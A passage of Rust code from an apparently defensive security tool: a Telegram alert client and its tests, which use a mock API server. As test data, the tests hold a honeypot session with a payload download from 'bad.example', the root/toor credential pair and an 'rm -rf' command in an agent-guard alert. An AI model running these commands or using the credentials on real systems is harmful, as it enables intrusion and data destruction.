            "chat_id": self.chat_id,
            "text": text,
            "has_keyboard": body.get("reply_markup").is_some(),
            "error": error,
        });
        if let Err(e) = append_jsonl_line(path, &record) {
            warn!(
                path = %path.display(),
                error = %e,
                "telegram failed-send jsonl write failed (non-fatal)"
            );
        }
    }
}

#[derive(Debug, Deserialize, Default)]
struct Update {
    update_id: i64,
    #[serde(default)]
    message: Option<Message>,
    #[serde(default)]
    callback_query: Option<CallbackQuery>,
}

#[derive(Debug, Deserialize)]
struct Message {
    #[serde(default)]
    message_id: i64,
    #[serde(default)]
    text: Option<String>,
    #[serde(default)]
    from: Option<User>,
    #[serde(default)]
    chat: Option<Chat>,
}

#[derive(Debug, Deserialize)]
struct Chat {
    id: i64,
}

#[derive(Debug, Deserialize)]
struct CallbackQuery {
    id: String,
    from: User,
    #[serde(default)]
    data: Option<String>,
    #[serde(default)]
    message: Option<CallbackMessage>,
}

/// Minimal representation of the message attached to a callback query.
#[derive(Debug, Deserialize)]
struct CallbackMessage {
    message_id: i64,
    #[serde(default)]
    chat: Option<Chat>,
}

#[derive(Debug, Deserialize)]
struct User {
    #[serde(default)]
    first_name: Option<String>,
}

/// Append an entry to the allowlist TOML file.
///
/// Creates the file if it does not exist. Each call appends a new
/// `[section]` header followed by the key-value pair so the sensor
/// picks it up on its next reload (every 60 s).

#[cfg(test)]
mod tests {
    use super::super::commands::{
        append_to_allowlist, log_allowlist_change, read_undoable_allowlist_entries,
        remove_from_allowlist,
    };
    use super::*;
    use axum::{
        body::Bytes,
        extract::State,
        http::{Method, Uri},
        routing::any,
        Json, Router,
    };
    use innerwarden_core::{entities::EntityRef, event::Severity};
    use serde_json::json;
    use std::collections::VecDeque;
    use std::net::SocketAddr;

    #[derive(Clone, Debug)]
    struct MockRequest {
        method: String,
        path: String,
        body: serde_json::Value,
    }

    #[derive(Clone, Default)]
    struct MockTelegramState {
        requests: Arc<tokio::sync::Mutex<Vec<MockRequest>>>,
        updates: Arc<tokio::sync::Mutex<VecDeque<serde_json::Value>>>,
        force_send_not_ok: bool,
    }

    async fn mock_telegram_handler(
        State(state): State<MockTelegramState>,
        method: Method,
        uri: Uri,
        body: Bytes,
    ) -> Json<serde_json::Value> {
        let body_json =
            serde_json::from_slice::<serde_json::Value>(&body).unwrap_or(serde_json::Value::Null);
        state.requests.lock().await.push(MockRequest {
            method: method.to_string(),
            path: uri.path().to_string(),
            body: body_json,
        });

        if uri.path().ends_with("/getUpdates") {
            let next = state
                .updates
                .lock()
                .await
                .pop_front()
                .unwrap_or_else(|| json!({ "ok": true, "result": [] }));
            Json(next)
        } else if state.force_send_not_ok {
            Json(json!({
                "ok": false,
                "description": "forced mock Telegram API failure"
            }))
        } else {
            Json(json!({
                "ok": true,
                "result": { "message_id": 777 }
            }))
        }
    }

    async fn start_mock_telegram_server(
        updates: Vec<serde_json::Value>,
    ) -> anyhow::Result<(
        MockTelegramState,
        tokio::task::JoinHandle<()>,
        u16,
        tempfile::TempDir,
    )> {
        start_mock_telegram_server_with_options(updates, false).await
    }

    async fn start_mock_telegram_server_with_options(
        updates: Vec<serde_json::Value>,
        force_send_not_ok: bool,
    ) -> anyhow::Result<(
        MockTelegramState,
        tokio::task::JoinHandle<()>,
        u16,
        tempfile::TempDir,
    )> {
        let _ = rustls::crypto::ring::default_provider().install_default();

        let state = MockTelegramState {
            requests: Arc::new(tokio::sync::Mutex::new(Vec::new())),
            updates: Arc::new(tokio::sync::Mutex::new(VecDeque::from(updates))),
            force_send_not_ok,
        };

        let app = Router::new()
            .route("/*path", any(mock_telegram_handler))
            .with_state(state.clone());

        let cert_dir = tempfile::tempdir()?;
        let cert_file = cert_dir.path().join("mock-cert.pem");
        let key_file = cert_dir.path().join("mock-key.pem");
        let params = rcgen::CertificateParams::new(vec![
            "api.telegram.org".to_string(),
            "localhost".to_string(),
        ])?;
        let key_pair = rcgen::KeyPair::generate()?;
        let cert = params.self_signed(&key_pair)?;
        std::fs::write(&cert_file, cert.pem())?;
        std::fs::write(&key_file, key_pair.serialize_pem())?;

        let tls = axum_server::tls_rustls::RustlsConfig::from_pem_file(&cert_file, &key_file)
            .await
            .context("failed to load mock Telegram TLS cert")?;

        let probe = std::net::TcpListener::bind("127.0.0.1:0")?;
        let port = probe.local_addr()?.port();
        drop(probe);

        let addr = SocketAddr::from(([127, 0, 0, 1], port));
        let handle = tokio::spawn(async move {
            let _ = axum_server::bind_rustls(addr, tls)
                .serve(app.into_make_service())
                .await;
        });

        tokio::time::sleep(Duration::from_millis(50)).await;
        Ok((state, handle, port, cert_dir))
    }

    fn build_test_client(port: u16, cert_dir: &std::path::Path) -> anyhow::Result<TelegramClient> {
        use std::sync::atomic::AtomicU32;

        let current_hour: u32 = chrono::Utc::now()
            .format("%H")
            .to_string()
            .parse()
            .unwrap_or(0);

        // Trust ONLY the self-signed cert the mock server generated for
        // this run. Scoping trust this tightly is what keeps
        // `danger_accept_invalid_certs` out of the codebase — the
        // rule rust/disabled-certificate-check that CodeQL flags is a
        // real security smell even in test code, because a shared
        // test harness with that flag can leak into prod builds.
        let cert_pem = std::fs::read(cert_dir.join("mock-cert.pem"))
            .context("failed to read mock TLS cert for test client")?;
        let mock_cert =
            reqwest::Certificate::from_pem(&cert_pem).context("mock TLS cert is not valid PEM")?;

        let http = reqwest::Client::builder()
            .timeout(Duration::from_secs(35))
            .add_root_certificate(mock_cert)
            .resolve("api.telegram.org", SocketAddr::from(([127, 0, 0, 1], port)))
            .build()
            .context("failed to build mock-aware reqwest client")?;

        Ok(TelegramClient {
            bot_token: "test-token".to_string(),
            // Numeric chat id matching the `chat: { id: 99 }` the polling tests
            // inject, so the (now fail-closed) inbound_authorized gate admits
            // them. A non-numeric id is dropped by design (see inbound_authorized).
            chat_id: "99".to_string(),
            dashboard_url: Some("https://dashboard.local".to_string()),
            dev_mode: false,
            http,
            last_send: Arc::new(tokio::sync::Mutex::new(
                tokio::time::Instant::now() - Duration::from_secs(1),
            )),
            alerts_this_hour: Arc::new(AtomicU32::new(0)),
            alert_counter_hour: Arc::new(AtomicU32::new(current_hour)),
            mock_outbox: None,
            telegram_sent_counter: None,
            audit_jsonl: None,
            failed_jsonl: None,
        })
    }

    fn make_incident() -> Incident {
        Incident {
            ts: chrono::Utc::now(),
            host: "srv-01".to_string(),
            incident_id: "ssh_bruteforce:198.51.100.10:2026-04-17T12:00:00Z".to_string(),
            severity: Severity::High,
            title: "SSH brute force burst".to_string(),
            summary: "20 failed attempts in 60s".to_string(),
            evidence: json!([]),
            recommended_checks: vec![],
            tags: vec!["ssh".to_string()],
            entities: vec![EntityRef::ip("198.51.100.10".to_string())],
        }
    }

    async fn assert_polling_send_failure_line(target_callback_data: &str) -> anyhow::Result<()> {
        let mut callbacks = Vec::new();
        for idx in 0..8_i64 {
            callbacks.push(json!({
                "update_id": 600 + idx,
                "callback_query": {
                    "id": format!("warmup-{idx}"),
                    "from": { "first_name": "Eve" },
                    "data": "dismiss2fa",
                    "message": { "message_id": 7000 + idx, "chat": { "id": 88 } }
                }
            }));
        }
        callbacks.push(json!({
            "update_id": 700,
            "callback_query": {
                "id": "target-cb",
                "from": { "first_name": "Eve" },
                "data": target_callback_data,
                "message": { "message_id": 7999, "chat": { "id": 88 } }
            }
        }));

        let updates = vec![json!({ "ok": true, "result": callbacks })];
        let (state, server, port, cert_dir) = start_mock_telegram_server(updates).await?;
        let client = Arc::new(build_test_client(port, cert_dir.path())?);
        let (tx, rx) = mpsc::channel::<ApprovalResult>(8);
        let mut task = tokio::spawn(client.run_polling(tx));

        for _ in 0..60usize {
            let saw_get_updates = {
                state
                    .requests
                    .lock()
                    .await
                    .iter()
                    .any(|r| r.path.ends_with("/getUpdates"))
            };
            if saw_get_updates {
                break;
            }
            tokio::time::sleep(Duration::from_millis(10)).await;
        }
        drop(rx);

        if tokio::time::timeout(Duration::from_secs(3), &mut task)
            .await
            .is_err()
        {
            task.abort();
            return Err(anyhow::anyhow!(
                "run_polling did not exit after forced send failure for {target_callback_data}"
            ));
        }

        server.abort();
        Ok(())
    }

    #[test]
    fn command_menu_is_profile_aware_and_decluttered() {
        let names = |v: &serde_json::Value| -> Vec<String> {
            v.as_array()
                .unwrap()
                .iter()
                .map(|c| c["command"].as_str().unwrap().to_string())
                .collect()
        };
        let lay = names(&TelegramClient::command_menu(true));
        let tech = names(&TelegramClient::command_menu(false));

        // Lay menu is tiny and jargon-free.
        assert_eq!(lay.len(), 5, "lay menu must stay small: {lay:?}");
        assert_eq!(
            lay,
            ["status", "threats", "mode", "ask", "help"],
            "lay menu content"
        );
        // The lay menu's only control is /mode (auto-defend on/off), which is
        // a real working command, so the menu carries no lie-by-button.

        // Technical menu is the full surface, with /mode and /posture present.
        assert_eq!(tech.len(), 11, "tech menu size: {tech:?}");
        assert!(tech.contains(&"mode".to_string()), "tech has /mode");
        assert!(
            tech.contains(&"posture".to_string()),
            "tech promotes /posture"
        );

        // The dropped lie-by-button commands appear in NEITHER menu.
        for menu in [&lay, &tech] {
            assert!(!menu.contains(&"guard".to_string()), "guard dropped");
            assert!(!menu.contains(&"watch".to_string()), "watch dropped");
        }
        // No menu item description carries an em dash (house rule).
        for v in [
            TelegramClient::command_menu(true),
            TelegramClient::command_menu(false),
        ] {
            for c in v.as_array().unwrap() {
                assert!(
                    !c["description"].as_str().unwrap().contains('\u{2014}'),
                    "no em dash in menu copy"
                );
            }
        }
    }

    #[test]
    fn inbound_authorized_enforces_numeric_chat_id() {
        // Numeric operator chat_id (every real deployment): only that chat passes.
        let c = TelegramClient::new("tok", "88", None).expect("client");
        assert!(c.inbound_authorized(88), "configured chat must pass");
        assert!(!c.inbound_authorized(99), "other chat must be dropped");
        assert!(
            !c.inbound_authorized(0),
            "missing/zero chat must be dropped"
        );

        // Non-numeric configured id (placeholder/typo/unset) FAILS CLOSED: every
        // update is dropped rather than authorising any sender for privileged
        // commands (/mode, /enable). A misconfigured id is never an open door.
        let c2 = TelegramClient::new("tok", "chat-123", None).expect("client");
        assert!(
            !c2.inbound_authorized(42),
            "non-numeric id must drop all senders"
        );
    }

    #[test]
    fn needs_review_text_renders_ip_title_and_severity() {
        let inc = make_incident();
        let text = TelegramClient::needs_review_text(&inc);
        assert!(text.contains("198.51.100.10"), "must show the attacker IP");
        assert!(
            text.contains("SSH brute force burst"),
            "must show the title"
        );
        assert!(text.contains("High"), "must show the severity");
        assert!(text.contains("Needs your review"));
        // Spec 067 Phase 1: enriched card carries detector + what-happened so
        // the operator can decide from the alert.
        assert!(text.contains("ssh_bruteforce"), "must show the detector");
        assert!(
            text.contains("20 failed attempts in 60s"),
            "must show the summary (what happened)"
        );
    }

    #[test]
    fn needs_review_text_falls_back_to_unknown_without_ip_entity() {
        let mut inc = make_incident();
        inc.entities.clear();
        let text = TelegramClient::needs_review_text(&inc);
        assert!(text.contains("<code>unknown</code>"));
    }

    #[test]
    fn needs_review_keyboard_callback_data_round_trips_colon_in_id() {
        // incident_id contains ':' — the callback_data must keep it intact so
        // bot_actions' splitn(2) reconstructs the same id for get_incident.
        let id = "kill_chain:9.9.9.9:test";
        let kb = TelegramClient::needs_review_keyboard(id);
        let block_cb = kb[0][0]["callback_data"].as_str().unwrap();
        let ignore_cb = kb[0][1]["callback_data"].as_str().unwrap();
        let dismiss_cb = kb[1][0]["callback_data"].as_str().unwrap();
        assert_eq!(block_cb, "review:block:kill_chain:9.9.9.9:test");
        assert_eq!(ignore_cb, "review:ignore:kill_chain:9.9.9.9:test");
        assert_eq!(dismiss_cb, "review:dismiss:kill_chain:9.9.9.9:test");
    }

    #[test]
    fn review_action_toast_and_emoji_cover_all_actions() {
        for action in ["block", "ignore", "dismiss", "wat"] {
            assert!(!TelegramClient::review_action_toast(action).is_empty());
            assert!(!TelegramClient::review_action_emoji(action).is_empty());
        }
        assert_ne!(
            TelegramClient::review_action_emoji("block"),
            TelegramClient::review_action_emoji("dismiss")
        );
    }

    #[tokio::test]
    async fn send_confirmation_request_uses_mock_response_message_id() -> anyhow::Result<()> {
        let (state, server, port, cert_dir) = start_mock_telegram_server(vec![]).await?;
        let client = build_test_client(port, cert_dir.path())?;

        let id = client
            .send_confirmation_request(
                &make_incident(),
                "iptables -A INPUT -s 198.51.100.10 -j DROP",
                "block-ip",
                0.92,
                120,
            )
            .await?;
        assert_eq!(id, 777);

        let requests = state.requests.lock().await.clone();
        let send_message = requests
            .iter()
            .find(|r| r.path.ends_with("/sendMessage"))
            .expect("sendMessage request should be emitted");
        assert_eq!(send_message.method, "POST");
        assert_eq!(send_message.body["chat_id"], "99");
        assert!(send_message.body["text"]
            .as_str()
            .unwrap_or("")
            .contains("Recommended action"));

        server.abort();
        Ok(())
    }

    #[tokio::test]
    async fn send_message_increments_counter_in_real_api_mode() -> anyhow::Result<()> {
        use std::sync::atomic::{AtomicU64, Ordering};

        let (_state, server, port, cert_dir) = start_mock_telegram_server(vec![]).await?;
        let mut client = build_test_client(port, cert_dir.path())?;
        let sent_counter = Arc::new(AtomicU64::new(0));
        client.set_telegram_sent_counter(sent_counter.clone());

        client.send_text_message("counter-check").await?;
        assert_eq!(sent_counter.load(Ordering::Relaxed), 1);

        server.abort();
        Ok(())
    }

    #[tokio::test]
    async fn get_updates_returns_empty_when_telegram_not_ok() -> anyhow::Result<()> {
        let updates = vec![json!({
            "ok": false,
            "description": "mock api failure"
        })];
        let (_state, server, port, cert_dir) = start_mock_telegram_server(updates).await?;
        let client = build_test_client(port, cert_dir.path())?;

        let parsed = client.get_updates(0).await?;
        assert!(
            parsed.is_empty(),
            "not-ok response should map to empty updates"
        );

        server.abort();
        Ok(())
    }

    #[tokio::test]
    async fn run_polling_routes_callback_prefixes_and_text_commands() -> anyhow::Result<()> {
        let updates = vec![json!({
            "ok": true,
            "result": [
                {
                    "update_id": 1,
                    "callback_query": {
                        "id": "cb-1",
                        "from": { "first_name": "Alice" },
                        "data": "quick:block:1.2.3.4",
                        "message": { "message_id": 1001, "chat": { "id": 99 } }
                    }
                },
                {
                    "update_id": 2,
                    "callback_query": {
                        "id": "cb-2",
                        "from": { "first_name": "Alice" },
                        "data": "hpot:monitor:2.2.2.2",
                        "message": { "message_id": 1002, "chat": { "id": 99 } }
                    }
                },
                {
                    "update_id": 3,
                    "callback_query": {
                        "id": "cb-3",
                        "from": { "first_name": "Alice" },
                        "data": "allow:proc:sshd",
                        "message": { "message_id": 1003, "chat": { "id": 99 } }
                    }
                },
                {
                    "update_id": 4,
                    "callback_query": {
                        "id": "cb-4",
                        "from": { "first_name": "Alice" },
                        "data": "allow:ip:10.0.0.1",
                        "message": { "message_id": 1004, "chat": { "id": 99 } }
                    }
                },
                {
                    "update_id": 5,
                    "callback_query": {
                        "id": "cb-5",
                        "from": { "first_name": "Alice" },
                        "data": "fp:incident-123",
                        "message": { "message_id": 1005, "chat": { "id": 99 } }
                    }
                },
                {
                    "update_id": 6,
                    "callback_query": {
                        "id": "cb-6",
                        "from": { "first_name": "Alice" },
                        "data": "autofp:yes:proc:sshd",
                        "message": { "message_id": 1006, "chat": { "id": 99 } }
                    }
                },
                {
                    "update_id": 7,
                    "callback_query": {
                        "id": "cb-7",
                        "from": { "first_name": "Alice" },
                        "data": "undo:proc:sshd",
                        "message": { "message_id": 1007, "chat": { "id": 99 } }
                    }
                },
                {
                    "update_id": 8,
                    "callback_query": {
                        "id": "cb-8",
                        "from": { "first_name": "Alice" },
                        "data": "enable2fa",
                        "message": { "message_id": 1008, "chat": { "id": 99 } }
                    }
                },
                {
                    "update_id": 9,
                    "callback_query": {
                        "id": "cb-9",
                        "from": { "first_name": "Alice" },
                        "data": "menu:status",
                        "message": { "message_id": 1009, "chat": { "id": 99 } }
                    }
                },
                {
                    "update_id": 10,
                    "callback_query": {
                        "id": "cb-10",
                        "from": { "first_name": "Alice" },
                        "data": "dismiss2fa",
                        "message": { "message_id": 1010, "chat": { "id": 99 } }
                    }
                },
                {
                    "update_id": 11,
                    "message": {
                        "message_id": 1011,
                        "text": "/enable ai",
                        "from": { "first_name": "Alice" },
                        "chat": { "id": 99 }
                    }
                },
                {
                    "update_id": 12,
                    "callback_query": {
                        "id": "cb-12",
                        "from": { "first_name": "Alice" },
                        "data": "review:dismiss:kill_chain:9.9.9.9:test",
                        "message": { "message_id": 1012, "chat": { "id": 99 } }
                    }
                }
            ]
        })];

        let (_state, server, port, cert_dir) = start_mock_telegram_server(updates).await?;
        let client = Arc::new(build_test_client(port, cert_dir.path())?);
        let (tx, mut rx) = mpsc::channel::<ApprovalResult>(32);

        let mut task = tokio::spawn(client.run_polling(tx));
        let mut incident_ids = Vec::new();
        for _ in 0..11usize {
            let result = tokio::time::timeout(Duration::from_secs(2), rx.recv())
                .await
                .context("timed out waiting for approval result")?
                .context("approval channel closed early")?;
            incident_ids.push(result.incident_id);
        }

        for expected in [
            "__quick_block__:1.2.3.4",
            "__hpot__:2.2.2.2",
            "__allow_proc__:sshd",
            "__allow_ip__:10.0.0.1",
            "__fp__:incident-123",
            "__autofp__:yes:proc:sshd",
            "__undo__:proc:sshd",
            "__enable2fa__",
            "__status__",
            "__enable__:ai",
            "__review__:kill_chain:9.9.9.9:test",
        ] {
            assert!(
                incident_ids.iter().any(|id| id == expected),
                "missing routed callback result: {expected}"
            );
        }

        drop(rx);
        if tokio::time::timeout(Duration::from_secs(2), &mut task)
            .await
            .is_err()
        {
            task.abort();
        }
        server.abort();
        Ok(())
    }

    #[tokio::test]
    async fn send_alert_html_stops_after_hourly_cap_and_sends_warning_once() -> anyhow::Result<()> {
        let (state, server, port, cert_dir) = start_mock_telegram_server(vec![]).await?;
        let client = build_test_client(port, cert_dir.path())?;

        for _ in 0..12usize {
            client.send_alert_html("<b>alert</b>").await?;
        }

        let requests = state.requests.lock().await.clone();
        let send_count = requests
            .iter()
            .filter(|r| r.path.ends_with("/sendMessage"))
            .count();
        assert_eq!(send_count, 11, "10 alerts + 1 flood warning should be sent");

        server.abort();
        Ok(())
    }

    #[tokio::test]
    async fn send_abuseipdb_autoblock_includes_dashboard_link() -> anyhow::Result<()> {
        let (state, server, port, cert_dir) = start_mock_telegram_server(vec![]).await?;
        let client = build_test_client(port, cert_dir.path())?;

        client
            .send_abuseipdb_autoblock(
                "203.0.113.55",
                95,
                80,
                120,
                Some("US"),
                Some("Example ISP"),
                "AbuseIPDB threshold exceeded",
                false,
                Some("https://dash.local"),
            )
            .await?;

        let requests = state.requests.lock().await.clone();
        let send_message = requests
            .iter()
            .find(|r| r.path.ends_with("/sendMessage"))
            .expect("sendMessage request should be emitted");
        assert!(send_message.body["text"]
            .as_str()
            .unwrap_or("")
            .contains("AbuseIPDB"));
        assert!(
            send_message.body["reply_markup"]["inline_keyboard"][0][0]["url"]
                .as_str()
                .unwrap_or("")
                .contains("subject_type=ip"),
            "dashboard deep-link should include subject_type=ip"
        );

        server.abort();
        Ok(())
    }

    #[tokio::test]
    async fn exercise_client_message_methods_and_allowlist_helpers() -> anyhow::Result<()> {
        let (state, server, port, cert_dir) = start_mock_telegram_server(vec![]).await?;
        let client = build_test_client(port, cert_dir.path())?;

        let incident = make_incident();
        let mut incident_without_ip = make_incident();
        incident_without_ip.entities.clear();

        client
            .send_incident_alert(&incident, GuardianMode::Guard, false)
            .await?;
        client
            .send_incident_alert(&incident_without_ip, GuardianMode::Watch, true)
            .await?;

        let reputation = crate::abuseipdb::IpReputation {
            confidence_score: 92,
            total_reports: 42,
            distinct_users: 10,
            country_code: Some("US".to_string()),
            isp: Some("ExampleISP".to_string()),
            is_tor: false,
        };
        let geo = crate::geoip::GeoInfo {
            country: "United States".to_string(),
            country_code: "US".to_string(),
            city: "Ashburn".to_string(),
            isp: "ExampleISP".to_string(),
            asn: "AS13335".to_string(),
        };

        client
            .send_action_report(
                "Block IP",
                "198.51.100.10",
                "SSH brute force burst",
                0.97,
                "srv-01",
                false,
                Some(&reputation),
                Some(&geo),
                true,
            )
            .await?;
        client
            .send_action_report(
                "Ignore",
                "198.51.100.10",
                "SSH brute force burst",
                0.62,
                "srv-01",
                false,
                None,
                None,
                false,
            )
            .await?;
        client
            .send_action_report(
                "Block IP",
                "198.51.100.10",
                "SSH brute force burst",
                0.73,
                "srv-01",
                true,
                None,
                None,
                false,
            )
            .await?;

        let guard_alert = crate::dashboard::AgentGuardAlert {
            ts: chrono::Utc::now(),
            agent_name: "CodexRunner".to_string(),
            // Long multi-byte command: byte index 120 falls mid-codepoint, so
            // a naive `&command[..120]` would panic. Exercises the safe
            // truncation branch in send_agent_guard_alert.
            command: format!("rm -rf /tmp/{}", "✓".repeat(140)),
            risk_score: 91,
            severity: "high".to_string(),
            recommendation: "deny".to_string(),
            signals: vec!["dangerous_command".to_string()],
            atr_rule_ids: vec!["ATR-001".to_string()],
            explanation: "dangerous operation".to_string(),
            tenant: None,
        };
        client.send_agent_guard_alert(&guard_alert).await?;

        client
            .send_onboarding("srv-01", 0, 0, GuardianMode::Guard)
            .await?;
        client
            .send_onboarding("srv-01", 3, 2, GuardianMode::Watch)
            .await?;

        let suggestion_msg_id = client
            .send_honeypot_suggestion(&incident, "198.51.100.10", "new hostile IP", 0.88, "block")
            .await?;
        assert_eq!(suggestion_msg_id, 777);

        client
            .resolve_confirmation(777, true, false, "Alice")
            .await?;
        client
            .resolve_confirmation(778, false, true, "Alice")
            .await?;

        let rich_iocs = crate::ioc::ExtractedIocs {
            ips: vec!["203.0.113.1".to_string()],
            domains: vec![],
            urls: vec!["http://bad.example/payload.sh".to_string()],
            categories: vec![],
        };
        let commands = vec![
            "whoami".to_string(),
            "curl http://bad.example/payload.sh".to_string(),
        ];
        let credentials = vec![("root".to_string(), Some("toor".to_string()))];
        client
            .send_honeypot_session_report(
                "198.51.100.10",
                "sess-1",
                45,
                &commands,
                &credentials,
                &rich_iocs,
                "malicious",
                false,
            )
            .await?;
        client
            .send_honeypot_session_report(
                "198.51.100.10",
                "sess-2",
                5,
                &Vec::new(),
                &Vec::new(),
                &crate::ioc::ExtractedIocs::default(),
                "probe-only",
                true,
            )
            .await?;

        client.send_text_message("<b>digest</b>").await?;
        client
            .send_text_with_keyboard(
                "<b>menu</b>",
                json!([[{"text": "Help", "callback_data": "menu:help"}]]),
            )
            .await?;
        client.send_menu(true).await?;
        client.send_menu(false).await?;
        client.react_eyes(42, 100).await;
        client.react(42, 101, "✅").await;
        client.send_typing().await;
        client.set_commands(true).await;
        client.set_commands(false).await;

        let dir = tempfile::tempdir()?;
        let allowlist_path = dir.path().join("allowlist.toml");
        append_to_allowlist(&allowlist_path, "ips", "203.0.113.5", "known scanner")?;
        append_to_allowlist(&allowlist_path, "processes", "sshd", "safe daemon")?;
        log_allowlist_change(dir.path(), "203.0.113.5", "ips", "alice", "add");
        log_allowlist_change(dir.path(), "203.0.113.5", "ips", "alice", "remove");
        log_allowlist_change(dir.path(), "sshd", "processes", "alice", "add");

        let undoable = read_undoable_allowlist_entries(dir.path(), 10);
        assert!(
            undoable
                .iter()
                .any(|(key, section, _, _)| key == "sshd" && section == "processes"),
            "process entry should remain undoable"
        );
        assert!(
            undoable
                .iter()
                .all(|(key, section, _, _)| !(key == "203.0.113.5" && section == "ips")),
            "removed ip entry should not remain undoable"
        );

        remove_from_allowlist(&allowlist_path, "ips", "203.0.113.5")?;
        let allowlist_text = std::fs::read_to_string(&allowlist_path)?;
        assert!(!allowlist_text.contains("203.0.113.5"));

        let requests = state.requests.lock().await.clone();
        assert!(
            requests.iter().any(|r| r.path.ends_with("/setMyCommands")),
            "set_commands should hit setMyCommands endpoint"
        );
        assert!(
            requests
                .iter()
                .filter(|r| r.path.ends_with("/sendMessage"))
                .count()
                >= 10,
            "method exercise should issue many sendMessage calls"
        );

        server.abort();
        Ok(())
    }

    #[tokio::test]
    async fn run_polling_handles_fp_check_explain_quick_ignore_and_invalid_ip() -> anyhow::Result<()>
    {
        let updates = vec![json!({
            "ok": true,
            "result": [
                {
                    "update_id": 21,
                    "callback_query": {
                        "id": "cb-21",
                        "from": { "first_name": "Bob" },
                        "data": "fp:check:incident-with-very-long-id-that-needs-truncation-1234567890",
                        "message": { "message_id": 2021, "chat": { "id": 99 } }
                    }
                },
                {
                    "update_id": 22,
                    "callback_query": {
                        "id": "cb-22",
                        "from": { "first_name": "Bob" },
                        "data": "explain:ssh_bruteforce",
                        "message": { "message_id": 2022, "chat": { "id": 99 } }
                    }
                },
                {
                    "update_id": 23,
                    "callback_query": {
                        "id": "cb-23",
                        "from": { "first_name": "Bob" },
                        "data": "quick:ignore",
                        "message": { "message_id": 2023, "chat": { "id": 99 } }
                    }
                },
                {
                    "update_id": 24,
                    "callback_query": {
                        "id": "cb-24",
                        "from": { "first_name": "Bob" },
                        "data": "quick:block:not-an-ip",
                        "message": { "message_id": 2024, "chat": { "id": 99 } }
                    }
                },
                {
                    "update_id": 25,
                    "callback_query": {
                        "id": "cb-25",
                        "from": { "first_name": "Bob" },
                        "data": "reject:incident-xyz",
                        "message": { "message_id": 2025, "chat": { "id": 99 } }
                    }
                },
                {
                    "update_id": 26,
                    "message": {
                        "message_id": 2026,
                        "text": "/start",
                        "from": { "first_name": "Bob" },
                        "chat": { "id": 99 }
                    }
                }
            ]
        })];

        let (_state, server, port, cert_dir) = start_mock_telegram_server(updates).await?;
        let client = Arc::new(build_test_client(port, cert_dir.path())?);
        let (tx, mut rx) = mpsc::channel::<ApprovalResult>(16);
        let mut task = tokio::spawn(client.run_polling(tx));

        let first = tokio::time::timeout(Duration::from_secs(2), rx.recv())
            .await
            .context("timed out waiting for first routed result")?
            .context("approval channel closed before first result")?;
        let second = tokio::time::timeout(Duration::from_secs(2), rx.recv())
            .await
            .context("timed out waiting for second routed result")?
            .context("approval channel closed before second result")?;

        let ids = vec![first.incident_id, second.incident_id];
        assert!(
            ids.iter().any(|id| id == "incident-xyz"),
            "reject callback should route parsed incident id"
        );
        assert!(
            ids.iter().any(|id| id == "__start__"),
            "/start message should route to __start__ sentinel"
        );

        drop(rx);
        if tokio::time::timeout(Duration::from_secs(2), &mut task)
            .await
            .is_err()
        {
            task.abort();
        }
        server.abort();
        Ok(())
    }

    #[tokio::test]
    async fn quick_ignore_records_fp_and_bare_enable_shows_usage() -> anyhow::Result<()> {
        // quick:ignore:<id> must route a REAL false-positive (__fp__:<id>) to the
        // feedback tracker (it previously only showed a toast claiming it did),
        // and bare /enable / /disable must route to the usage sentinel instead of
        // the generic unknown-command hint.
        let updates = vec![json!({
            "ok": true,
            "result": [
                {
                    "update_id": 41,
                    "callback_query": {
                        "id": "cb-41",
                        "from": { "first_name": "Bob" },
                        "data": "quick:ignore:inc-99",
                        "message": { "message_id": 4041, "chat": { "id": 99 } }
                    }
                },
                {
                    "update_id": 42,
                    "message": {
                        "message_id": 4042,
                        "text": "/enable",
                        "from": { "first_name": "Bob" },
                        "chat": { "id": 99 }
                    }
                },
                {
                    "update_id": 43,
                    "message": {
                        "message_id": 4043,
                        "text": "/disable",
                        "from": { "first_name": "Bob" },
                        "chat": { "id": 99 }
                    }
                }
            ]
        })];

        let (_state, server, port, cert_dir) = start_mock_telegram_server(updates).await?;
        let client = Arc::new(build_test_client(port, cert_dir.path())?);
        let (tx, mut rx) = mpsc::channel::<ApprovalResult>(16);
        let mut task = tokio::spawn(client.run_polling(tx));

        let mut ids = Vec::new();
        while let Ok(Some(r)) = tokio::time::timeout(Duration::from_secs(2), rx.recv()).await {
            ids.push(r.incident_id);
            if ids.len() >= 3 {
                break;
            }
        }
        assert!(
            ids.iter().any(|id| id == "__fp__:inc-99"),
            "quick:ignore:<id> must record a real false positive (__fp__:<id>), got {ids:?}"
        );
        assert_eq!(
            ids.iter()
                .filter(|id| id.as_str() == "__cap_usage__")
                .count(),
            2,
            "bare /enable and /disable must both route to __cap_usage__, got {ids:?}"
        );

        drop(rx);
        if tokio::time::timeout(Duration::from_secs(2), &mut task)
            .await
            .is_err()
        {
            task.abort();
        }
        server.abort();
        Ok(())
    }

    #[tokio::test]
    async fn get_updates_returns_empty_when_result_cannot_deserialize() -> anyhow::Result<()> {
        let updates = vec![json!({
            "ok": true,
            "result": { "unexpected": "shape" }
        })];
        let (_state, server, port, cert_dir) = start_mock_telegram_server(updates).await?;
        let client = build_test_client(port, cert_dir.path())?;

        let parsed = client.get_updates(0).await?;
        assert!(
            parsed.is_empty(),
            "malformed getUpdates payload should be treated as empty"
        );

        server.abort();
        Ok(())
    }

    #[tokio::test]
    async fn exercise_remaining_client_message_branches() -> anyhow::Result<()> {
        use std::sync::atomic::Ordering;

        let (_state, server, port, cert_dir) = start_mock_telegram_server(vec![]).await?;
        let client = build_test_client(port, cert_dir.path())?;
        let incident = make_incident();

        client
            .send_incident_alert(&incident, GuardianMode::Watch, false)
            .await?;

        let geo = crate::geoip::GeoInfo {
            country: "France".to_string(),
            country_code: "FR".to_string(),
            city: "Paris".to_string(),
            isp: "ISP Corp".to_string(),
            asn: "AS64512".to_string(),
        };
        client
            .send_action_report(
                "Block IP",
                "198.51.100.10",
                "Suspicious login wave",
                0.88,
                "srv-01",
                false,
                None,
                Some(&geo),
                false,
            )
            .await?;
        client
            .send_action_report(
                "Block IP",
                "198.51.100.10",
                "Possible scanner",
                0.52,
                "srv-01",
                false,
                None,
                None,
                false,
            )
            .await?;
        client
            .send_action_report(
                "Block IP",
                "198.51.100.10",
                "Sustained suspicious probing",
                0.73,
                "srv-01",
                false,
                None,
                None,
                false,
            )
            .await?;

        for confidence in [0.80_f32, 0.65_f32, 0.40_f32] {
            let msg_id = client
                .send_confirmation_request(
                    &incident,
                    "ufw deny from 198.51.100.10",
                    "block-ip",
                    confidence,
                    30,
                )
                .await?;
            assert_eq!(msg_id, 777);
        }

        let medium_review_alert = crate::dashboard::AgentGuardAlert {
            ts: chrono::Utc::now(),
